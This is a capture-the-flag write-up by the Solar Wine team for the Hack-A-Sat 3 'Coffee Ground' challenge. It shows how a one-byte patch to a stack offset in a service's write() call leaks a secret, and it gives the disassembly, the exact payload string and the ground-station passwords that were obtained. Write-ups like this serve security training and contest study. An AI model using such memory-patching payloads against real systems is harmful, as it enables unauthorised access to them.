# HACK-A-SAT 3: Coffee Ground

* **Category:** Ground Station Access
* **Points:** 3400 per Ground Station on first connection
* **Description:**

Went for a coffee run and found something sus.

Teams are given a `intel_drop.tar.xz` archive that contains:

* `coffee.java`: ELF x86-64,
* `coffee.png`: 1024x682 JPEG image,
* `serv`: ELF x86-64.

![Content of `coffee.png`](images/coffee.jpg)

## Write-up

_Write-up by Solar Wine team_

There were 5 instances of this service running on ports 13000 through 13004.

The `key` variable is on the stack at offset `RBP + -0xb8` (0xffffff48). When writing back, the server uses a variable on the stack at offset `RBP + -0xa8`:

```
00102004 8b 85 28 ff ff ff      MOV        EAX,dword ptr [RBP + -0xd8]=>in_size
0010200a 48 63 d0               MOVSXD     RDX,EAX
0010200d 48 8b 8d 58 ff ff ff   MOV        RCX,qword ptr [RBP + -0xa8]=>local_b0
00102014 8b 85 30 ff ff ff      MOV        EAX,dword ptr [RBP + -0xd0]=>local_d8
0010201a 48 89 ce               MOV        RSI,RCX
0010201d 89 c7                  MOV        EDI,EAX
0010201f e8 6c f1 ff ff         CALL       <EXTERNAL>::write
```

Since we can patch any byte of the service, replace `58 ff ff ff` with `48 ff ff ff` in the instruction at `0010200d` to output the flag.

The offset in the file is 0x2010, so sending `b'8208\nH8\nhello!  '` will output the password.

Using this attack gives rolling password to connect to new Ground Stations,
for example:

* port 13000, Guam: `YJsiWoh9`,
* port 13001, Mauritius: `JF-CM03E`,
* port 13002, Mingenew: `qL_MPv3_`,
* port 13003, LosAngeles: `jMOLbpmi`,
* port 13004, Cordoba: `kCt9XFgr`.
